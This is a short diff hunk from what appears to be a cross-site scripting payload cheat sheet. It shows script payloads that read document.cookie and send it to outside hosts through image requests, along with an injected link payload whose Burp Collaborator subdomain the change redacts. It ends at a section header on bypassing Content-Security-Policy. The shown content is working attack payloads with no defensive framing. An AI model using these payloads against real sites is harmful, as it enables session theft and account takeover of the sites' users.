@@ -24,7 +24,7 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 
 <script>img = new Image(); img.src = "http://192.168.1.44/a.php?"+document.cookie;</script>
 
-"><a%20href="https://7y6y39s5iggdgk66zwxvmvojeak48t.burpcollaborator.net"><H1>Click%20here!</H1></a><input
+"><a%20href="https://xxxxxxxxxxxxxxx.burpcollaborator.net"><H1>Click%20here!</H1></a><input
 
 ==============================================================================
 [+] Bypass Content-security-policy header XSS
